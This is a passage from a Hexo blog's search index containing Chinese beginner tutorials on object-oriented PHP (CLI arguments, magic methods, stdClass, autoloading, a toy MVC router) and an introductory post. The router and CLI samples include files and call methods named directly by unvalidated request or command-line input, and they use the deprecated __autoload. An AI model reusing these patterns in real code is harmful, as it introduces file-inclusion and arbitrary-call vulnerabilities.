class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$pi</span>=<span class="variable">$_SERVER</span>[<span class="string">'PATH_INFO'</span>];</span><br><span class="line"><span class="variable">$controller</span>=explode(<span class="string">'/'</span>,<span class="variable">$pi</span>)[1];</span><br><span class="line"><span class="variable">$method</span>=explode(<span class="string">'/'</span>,<span class="variable">$pi</span>)[2];</span><br><span class="line">require (getcwd().<span class="string">'/code/'</span>.<span class="variable">$controller</span>.<span class="string">".class.php"</span>);</span><br><span class="line"><span class="variable">$get_class</span>=new <span class="variable">$controller</span>();</span><br><span class="line"><span class="variable">$get_class</span>-&gt;<span class="variable">$method</span>();</span><br></pre></td></tr></table></figure><h4 id="效果-3"><a href="#效果-3" class="headerlink" title="效果 : "></a><strong>效果 : </strong></h4><p><img src="http://img.blog.csdn.net/20170807115707525?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php学习系列2</title>
      <link href="/2017/08/04/%E8%AE%A4%E7%9C%9F%E5%AD%A6%E4%B9%A0php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-2/"/>
      <url>/2017/08/04/%E8%AE%A4%E7%9C%9F%E5%AD%A6%E4%B9%A0php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-2/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="认真学习php面向对象-2"><a href="#认真学习php面向对象-2" class="headerlink" title="认真学习php面向对象-2"></a>认真学习php面向对象-2</h1><h3 id="前言"><a href="#前言" class="headerlink" title=" 前言"></a><strong> 前言</strong></h3><p>准备写一个认真学习php面向对象的系列，使用php来做网页，没有深入了解php的话，可能三板斧就够了，并不需要有多高深！如有错误，欢迎各位不吝赐教！进度安排的话，我学到哪里，就更新到哪里了！形式的话就采用一个需求小案例，然后实现，并附上自己的总结,<a href="https://github.com/shisiying/phpOrinentedObject/tree/master" target="_blank" rel="noopener">文章源码</a></p><h3 id="所用到的环境"><a href="#所用到的环境" class="headerlink" title=" 所用到的环境 "></a><strong> 所用到的环境 </strong></h3><p>系统:ubuntu16.04<br>编辑器:phpstorm2017</p><h3 id="需求-：1-参数容错以及自动化调用方法"><a href="#需求-：1-参数容错以及自动化调用方法" class="headerlink" title=" 需求 ：1)参数容错以及自动化调用方法 "></a><strong> 需求 ：1)参数容错以及自动化调用方法 </strong></h3><h4 id="解决-callstatic的使用以及构造调用函数"><a href="#解决-callstatic的使用以及构造调用函数" class="headerlink" title=" 解决 : __callstatic的使用以及构造调用函数 "></a><strong> 解决 : __callstatic的使用以及构造调用函数 </strong></h4><ol><li>__callstatic在调用一个类不存在的静态函数的时候会触发这个函数的执行，我们可以使用这个对输入一个不存在的参数的时候进行友好报错处理。</li><li>自动化调用，参数不多的时候，我们可以在类中指定函数名，但是当函数过多的时候，这种调用明显很费力，我们可以采取构造函数名的方法，对函数进行调用</li></ol><h4 id="实现"><a href="#实现" class="headerlink" title="实现 : "></a><strong>实现 : </strong></h4><h4 id="自动化调用"><a href="#自动化调用" class="headerlink" title=" 自动化调用 "></a><strong> 自动化调用 </strong></h4><h4 id="god-hp"><a href="#god-hp" class="headerlink" title=" god.hp "></a><strong> god.hp </strong></h4><pre><code>require (&quot;god_calss.php&quot;); $result=&apos;&apos;; if ($argc&gt;=2) {     $p=$argv[1];     if(substr($p,0,1)==&apos;-&apos;) {         $p=substr($argv[1],1);         $result=god_calss::$p();     } else {         $result=&quot;you shuold add - to call the function!&quot;;     } //        &apos;-v&apos;==$argv[1] &amp;&amp; $result =god_calss::version(); //        &apos;-init&apos;==$argv[1] &amp;&amp; god_calss::init(); //        &apos;-make&apos;==$argv[1] &amp;&amp; god_calss::make(); } echo $result; echo PHP_EOL;</code></pre><h4 id="容错处理"><a href="#容错处理" class="headerlink" title=" 容错处理 "></a><strong> 容错处理 </strong></h4><h4 id="god-class-hp"><a href="#god-class-hp" class="headerlink" title=" god_class.hp "></a><strong> god_class.hp </strong></h4><pre><code>static function __callStatic($name, $arguments)     {         // TODO: Implement __callStatic() method.         echo &quot;the function you call is undefined!&quot;;     }</code></pre><h4 id="效果"><a href="#效果" class="headerlink" title="效果 : "></a><strong>效果 : </strong></h4><p><img src="http://img.blog.csdn.net/20170804225008998?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h3 id="需求-：2-使用stdclass临时存储改造init"><a href="#需求-：2-使用stdclass临时存储改造init" class="headerlink" title="需求 ：2)使用stdclass临时存储改造init"></a><strong>需求 ：2)使用stdclass临时存储改造init</strong></h3><h4 id="解决-stdClass"><a href="#解决-stdClass" class="headerlink" title="解决 : stdClass"></a><strong>解决 : stdClass</strong></h4><ol><li>stdClass 在PHP内核进行模块初始化操作时会自动加载这个函数，它的所有的魔术方法，父类、接口等在初始化时都被设置成NULL。由于在PHP中对于一个类我们无法动态的添加方法， 所以这个类只能用来处理动态属性</li></ol><h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现 : "></a><strong>实现 : </strong></h4><h4 id="改造init"><a href="#改造init" class="headerlink" title=" 改造init "></a><strong> 改造init </strong></h4><h4 id="god-class-hp-1"><a href="#god-class-hp-1" class="headerlink" title=" god_class.hp "></a><strong> god_class.hp </strong></h4><pre><code>static function init() {       echo &quot;input your project_name?&quot;.PHP_EOL;       $prj_name=fgets(STDIN);       echo  &quot;input your author_name?&quot;.PHP_EOL;       $author=fgets(STDIN);       echo &quot;your input:&quot;.PHP_EOL;       echo json_encode(TC(array(&apos;prj_name&apos;=&gt;$prj_name,&apos;author&apos;=&gt;$author)));   }</code></pre><h4 id="god-func-hp"><a href="#god-func-hp" class="headerlink" title=" god_func.hp "></a><strong> god_func.hp </strong></h4><p>   //返回一个存储用户输入的对象</p><pre><code>function TC($p) {  $get_class=new stdClass();  foreach ($p as $k=&gt;$v) {      $get_class-&gt;$k=$v;  }  return $get_class;}</code></pre><h4 id="god-hp-1"><a href="#god-hp-1" class="headerlink" title=" god.hp "></a><strong> god.hp </strong></h4><p>一定要再class文件前面<br>    require (“god_func.php”);<br>    require (“god_calss.php”);</p><h4 id="效果-1"><a href="#效果-1" class="headerlink" title="效果 : "></a><strong>效果 : </strong></h4><p><img src="http://img.blog.csdn.net/20170804231838423?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h3 id="需求-：3-接受用户输入的参数创建文件夹"><a href="#需求-：3-接受用户输入的参数创建文件夹" class="headerlink" title="需求 ：3)接受用户输入的参数创建文件夹"></a><strong>需求 ：3)接受用户输入的参数创建文件夹</strong></h3><h4 id="解决-mkdir和file-get-contents和json-decode"><a href="#解决-mkdir和file-get-contents和json-decode" class="headerlink" title="解决 : mkdir和file_get_contents和json_decode"></a><strong>解决 : mkdir和file_get_contents和json_decode</strong></h4><p>具体用法可以查下官网手册</p><ol><li><p>前面我们接受用户输入，并将其存入json文件当中，现在要做的是从json文件读取数据，返回对象，创建用户输入对应的文件夹</p><h4 id="实现-2"><a href="#实现-2" class="headerlink" title="实现 : "></a><strong>实现 : </strong></h4><h4 id="改造init-1"><a href="#改造init-1" class="headerlink" title="改造init"></a><strong>改造init</strong></h4><h4 id="god-class-hp-2"><a href="#god-class-hp-2" class="headerlink" title="god_class.hp"></a><strong>god_class.hp</strong></h4><pre><code>static function start() {     $config=loadconfig();     //创建文件夹     !file_exists(getcwd().&apos;/&apos;.$config-&gt;prj_name) &amp;&amp; mkdir(getcwd().&apos;/&apos;.$config-&gt;prj_name);     //创建文件     !file_exists(getcwd().&apos;/&apos;.$config-&gt;prj_name.&apos;/index.php&apos;) &amp;&amp; file_put_contents(getcwd().&apos;/&apos;.$config-&gt;prj_name.&apos;/index.php&apos;,&apos;&apos;);    }</code></pre><h4 id="god-func-hp-1"><a href="#god-func-hp-1" class="headerlink" title="god_func.hp"></a><strong>god_func.hp</strong></h4><p>  function loadconfig(){</p><pre><code>    $file=file_get_contents(getcwd().&apos;/god.json&apos;);    return json_decode($file);}</code></pre><h4 id="效果-2"><a href="#效果-2" class="headerlink" title="效果 : "></a><strong>效果 : </strong></h4><p><img src="http://img.blog.csdn.net/20170805003222937?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p></li></ol><h3 id="需求-：4-自动引入用户需要调用的类文件"><a href="#需求-：4-自动引入用户需要调用的类文件" class="headerlink" title="需求 ：4)自动引入用户需要调用的类文件"></a><strong>需求 ：4)自动引入用户需要调用的类文件</strong></h3><h4 id="解决-autoload和命名空间namespace的使用"><a href="#解决-autoload和命名空间namespace的使用" class="headerlink" title="解决 : __autoload和命名空间namespace的使用"></a><strong>解决 : __autoload和命名空间namespace的使用</strong></h4><p>将上述创建文件自定义了一个类，为了更有规划的搭建整个项目的框架，项目文件目录变成这样子，core代表项目的核心文件目录，frame就是我们所引用的外部类库文件目录，template就是模板文件目录<br><img src="http://img.blog.csdn.net/20170805013807432?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h4 id="实现-3"><a href="#实现-3" class="headerlink" title="实现 : "></a><strong>实现 : </strong></h4><h4 id="改造init-2"><a href="#改造init-2" class="headerlink" title="改造init"></a><strong>改造init</strong></h4><h4 id="god-class-hp-3"><a href="#god-class-hp-3" class="headerlink" title="god_class.hp"></a><strong>god_class.hp</strong></h4><p>在类名外面写入如下代码</p><pre><code>use core\frame\god_frame;function __autoload($className) {    $className=str_replace(&apos;\\&apos;,&apos;/&apos;,$className).&apos;.php&apos;;        require($className);}</code></pre><p>方法调用:</p><pre><code>static function start() {          $config=loadconfig();           $ff=new god_frame($config-&gt;prj_name);           $ff-&gt;run();      }</code></pre><h4 id="god-frame-hp"><a href="#god-frame-hp" class="headerlink" title="god_frame.hp"></a><strong>god_frame.hp</strong></h4><pre><code>namespace core\frame;class god_frame{    public $project_folder=&quot;&quot;;//项目入口文件    public $project_main=&quot;&quot;;//入口文件    function __construct($prjName)    {        $this-&gt;project_folder=getcwd().&quot;/&quot;.$prjName;        $this-&gt;project_main=$this-&gt;project_folder.&apos;/index.php&apos;;    }    function run() {        !file_exists($this-&gt;project_folder) &amp;&amp; mkdir($this-&gt;project_folder);        !file_exists($this-&gt;project_main) &amp;&amp; file_put_contents($this-&gt;project_main,&apos;&apos;);    }}</code></pre><h4 id="效果-3"><a href="#效果-3" class="headerlink" title="效果 : "></a><strong>效果 : </strong></h4><p><img src="http://img.blog.csdn.net/20170805021030570?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php学习系列1</title>
      <link href="/2017/08/03/%E8%AE%A4%E7%9C%9F%E5%AD%A6%E4%B9%A0php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-1/"/>
      <url>/2017/08/03/%E8%AE%A4%E7%9C%9F%E5%AD%A6%E4%B9%A0php%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-1/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="认真学习php面向对象-1"><a href="#认真学习php面向对象-1" class="headerlink" title="认真学习php面向对象-1"></a>认真学习php面向对象-1</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>准备写一个认真学习php面向对象的系列，使用php来做网页，没有深入了解php的话，可能三板斧就够了，并不需要有多高深！如有错误，欢迎各位不吝赐教！进度安排的话，我学到哪里，就更新到哪里了！形式的话就采用一个需求小案例，然后实现，并附上自己的总结，<a href="https://github.com/shisiying/phpOrinentedObject/tree/master" target="_blank" rel="noopener">文章源码</a></p><h2 id="主要完成工作"><a href="#主要完成工作" class="headerlink" title="主要完成工作"></a><strong>主要完成工作</strong></h2><ol><li>使用命令行模式模拟编译文件以及创建文件</li><li>实现简单的网站骨架以及mvc路由伪编译的作用</li></ol><h3 id="开篇所用到的环境"><a href="#开篇所用到的环境" class="headerlink" title=" 开篇所用到的环境 "></a><strong> 开篇所用到的环境 </strong></h3><p>系统:ubuntu16.04<br>编辑器:phpstorm2017</p><h3 id="需求-：1-在终端命令行下执行脚本文件并输入参数-v-然后显示版本号"><a href="#需求-：1-在终端命令行下执行脚本文件并输入参数-v-然后显示版本号" class="headerlink" title=" 需求 ：1)在终端命令行下执行脚本文件并输入参数-v,然后显示版本号 "></a><strong> 需求 ：1)在终端命令行下执行脚本文件并输入参数-v,然后显示版本号 </strong></h3><h4 id="解决-需要用到php的预定义变量-argc和-argv"><a href="#解决-需要用到php的预定义变量-argc和-argv" class="headerlink" title=" 解决 : 需要用到php的预定义变量$argc和$argv "></a><strong> 解决 : 需要用到php的预定义变量$argc和$argv </strong></h4><p>$argc和$argv都是php的预定义变量，可以接收到命令行下下时传递给当前脚本的参数的数组。argc是参数的个数，argv是传递给脚本的参数数组</p><h4 id="实现"><a href="#实现" class="headerlink" title=" 实现 : "></a><strong> 实现 : </strong></h4><pre><code>$result=&apos;&apos;;if ($argc&gt;=2) {    &apos;-v&apos;==$argv[1] &amp;&amp; $result =&apos;the version is 1.0&apos;;}echo $result;echo PHP_EOL;</code></pre><h4 id="效果"><a href="#效果" class="headerlink" title="效果 : "></a><strong>效果 : </strong></h4><p><img src="http://img.blog.csdn.net/20170803194421516?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h3 id="需求-：2-在终端命令行下执行脚本文件并输入参数init-在当前目录下生成一个json文件"><a href="#需求-：2-在终端命令行下执行脚本文件并输入参数init-在当前目录下生成一个json文件" class="headerlink" title="需求 ：2)在终端命令行下执行脚本文件并输入参数init,在当前目录下生成一个json文件"></a><strong>需求 ：2)在终端命令行下执行脚本文件并输入参数init,在当前目录下生成一个json文件</strong></h3><h4 id="解决-file-put-contents-官网用法如下"><a href="#解决-file-put-contents-官网用法如下" class="headerlink" title="**解决 : file_put_contents,官网用法如下:"></a>**解决 : file_put_contents,官网用法如下:</h4><blockquote><p>int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )<br>返回值:该函数将返回写入到文件内数据的字节数，失败时返回FALSE</p></blockquote><h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现 : "></a><strong>实现 : </strong></h4><pre><code>$result=&apos;&apos;;    if ($argc&gt;=2) {        &apos;-v&apos;==$argv[1] &amp;&amp; $result =&apos;the god version is 1.0&apos;;        &apos;-init&apos;==$argv[1] &amp;&amp; $result =file_put_contents(getcwd().&apos;/god.json&apos;,&apos;{}&apos;).&apos; of bytes is written.&apos;        .PHP_EOL.&apos;god.json is created!&apos;;    }    echo $result;    echo PHP_EOL;</code></pre><h4 id="效果-1"><a href="#效果-1" class="headerlink" title="效果 : "></a><strong>效果 : </strong></h4><p><img src="http://img.blog.csdn.net/20170803194627200?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><p><img src="http://img.blog.csdn.net/20170803194642091?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h3 id="需求-：3-判断当前php版本"><a href="#需求-：3-判断当前php版本" class="headerlink" title="需求 ：3)判断当前php版本"></a><strong>需求 ：3)判断当前php版本</strong></h3><h4 id="解决-substr函数，常量PHP-VERSION"><a href="#解决-substr函数，常量PHP-VERSION" class="headerlink" title="**解决 : substr函数，常量PHP_VERSION"></a>**解决 : substr函数，常量PHP_VERSION</h4><h4 id="实现-2"><a href="#实现-2" class="headerlink" title="实现 : "></a><strong>实现 : </strong></h4><pre><code>substr(PHP_VERSION,0,1);</code></pre><h4 id="效果-2"><a href="#效果-2" class="headerlink" title="效果 : "></a><strong>效果 : </strong></h4><p><img src="http://img.blog.csdn.net/20170803202705726?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><h3 id="需求-：3-使用面向对象改造面向过程代码"><a href="#需求-：3-使用面向对象改造面向过程代码" class="headerlink" title="需求 ：3)使用面向对象改造面向过程代码"></a><strong>需求 ：3)使用面向对象改造面向过程代码</strong></h3><h4 id="解决-创建类，封装函数"><a href="#解决-创建类，封装函数" class="headerlink" title="**解决 : 创建类，封装函数"></a>**解决 : 创建类，封装函数</h4><h4 id="实现-3"><a href="#实现-3" class="headerlink" title="实现 : "></a><strong>实现 : </strong></h4><h5 id="god-class-php"><a href="#god-class-php" class="headerlink" title="god_class.php"></a>god_class.php</h5><pre><code>class god_calss{   static $version=&quot;the god version is 1.0&quot;;   static public function version() {       return self::$version;   }   static public function  getconfig() {       return file_put_contents(getcwd().&apos;/god.json&apos;,&apos;{}&apos;).&apos; of bytes is written.&apos;    .PHP_EOL.&apos;god.json is created!&apos;;   }}</code></pre><h5 id="god-php"><a href="#god-php" class="headerlink" title="god.php"></a>god.php</h5><pre><code>require (&quot;god_calss.php&quot;);    $result=&apos;&apos;;    if ($argc&gt;=2) {        &apos;-v&apos;==$argv[1] &amp;&amp; $result =god_calss::version();        &apos;-init&apos;==$argv[1] &amp;&amp; $result =god_calss::getconfig();    }    echo $result;    echo PHP_EOL;</code></pre><h3 id="需求-：4-使用STDIN获取命令行输入"><a href="#需求-：4-使用STDIN获取命令行输入" class="headerlink" title="需求 ：4)使用STDIN获取命令行输入"></a><strong>需求 ：4)使用STDIN获取命令行输入</strong></h3><h4 id="解决-fgets（从文件指针中读取一行）-STDIN-标准输入对象，c语言"><a href="#解决-fgets（从文件指针中读取一行）-STDIN-标准输入对象，c语言" class="headerlink" title="**解决 : fgets（从文件指针中读取一行）,STDIN(标准输入对象，c语言)"></a>**解决 : fgets（从文件指针中读取一行）,STDIN(标准输入对象，c语言)</h4><h4 id="实现-4"><a href="#实现-4" class="headerlink" title="实现 : "></a><strong>实现 : </strong></h4><h4 id="god-class-php-1"><a href="#god-class-php-1" class="headerlink" title="god_class.php"></a>god_class.php</h4><pre><code>static function init() {      echo &quot;input your project_name?&quot;.PHP_EOL;      self::$prj_name=fgetc(STDIN);      echo  &quot;input your author_name?&quot;.PHP_EOL;      self::$author=fgetc(STDIN);      echo &quot;your input:&quot;;      echo self::$prj_name.PHP_EOL;      echo self::$author.PHP_EOL;  }</code></pre><h4 id="god-php-1"><a href="#god-php-1" class="headerlink" title="god.php"></a>god.php</h4><pre><code>require (&quot;god_calss.php&quot;);    $result=&apos;&apos;;    if ($argc&gt;=2) {        &apos;-v&apos;==$argv[1] &amp;&amp; $result =god_calss::version();        &apos;-init&apos;==$argv[1] &amp;&amp; god_calss::init();    }    echo $result;    echo PHP_EOL;</code></pre><h4 id="效果-3"><a href="#效果-3" class="headerlink" title="效果: "></a><strong>效果: </strong></h4><p><img src="http://img.blog.csdn.net/20170803210553522?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Hello World</title>
      <link href="/2017/06/18/hello-world/"/>
      <url>/2017/06/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p> 写在前面<br><a id="more"></a></p><h3 id="为什么想要写一个博客"><a href="#为什么想要写一个博客" class="headerlink" title="为什么想要写一个博客"></a>为什么想要写一个博客</h3><ul><li>感觉我们这些小透明，如果不写点东西证明自己的存在感的话，感觉世界都没有我们的痕迹啦，每天日出而作，日落而归，就像古时的农民一样，默默耕耘，最后化成一抔黄土。</li><li>记录自己的成长之路，学习技术，注重基础的学习与积累，写博客有助于我们巩固知识点，同时也可以向我们的雇主展示我们的学习经历与作品</li></ul><h3 id="使用静态站点的原因"><a href="#使用静态站点的原因" class="headerlink" title="使用静态站点的原因"></a>使用静态站点的原因</h3><p>现在写作平台有很多，为什么使用自己搭建的静态站点呢？</p><ul><li>静态站点不用买vps，节省一点费用，同时不用经常去维护vps</li><li>数据在我们本地，不用担心其他协作平台的约束以及数据丢失</li><li>话虽如此，自己的博客访问量还是跟大协作平台还是有差距的，如果想让更过看到你的博客，大的写作平台也是一个不错的选择，这里我把csdn博客在这里做一个备份，同时也写一点自己的心路历程</li></ul><h3 id="谢谢观看！"><a href="#谢谢观看！" class="headerlink" title="谢谢观看！"></a>谢谢观看！</h3>]]></content>
      
      
      <categories>
          
          <category> 推文 </category>
          
      </categories>
      
      
    </entry>
    
  
  
</search>
